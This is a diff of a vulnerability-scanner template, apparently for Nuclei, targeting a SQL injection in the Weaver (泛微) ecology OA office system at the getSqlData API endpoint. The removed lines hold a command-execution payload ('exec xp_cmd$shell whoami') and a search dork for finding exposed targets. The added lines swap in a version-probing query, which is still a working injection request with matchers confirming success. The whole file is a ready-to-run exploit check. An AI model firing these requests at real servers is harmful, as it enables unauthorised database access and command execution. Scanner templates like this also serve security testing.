@@ -1,24 +1,22 @@
 id: ecology-sqli
-
 info:
-  name: POCID10714 泛微ecology协同商务办公系统SQL注入
-  author: l1b3ri
+  author: Str1am
+  name: "POCID10714 \u6CDB\u5FAEecology\u534F\u540C\u5546\u52A1\u529E\u516C\u7CFB\u7EDF\
+    SQL\u6CE8\u5165"
   severity: high
-  description: fofa-dork app="泛微-协同办公OA"
   tags: ecology,sqli
-
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql=exec%20xp_cmd$shell%20%27whoami%27;"
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-      - type: word
-        words:
-          - "output"
-          - "mssqlserver"
-        part: body
-        condition: and
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - api_status
+    - Microsoft SQL Server
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version'
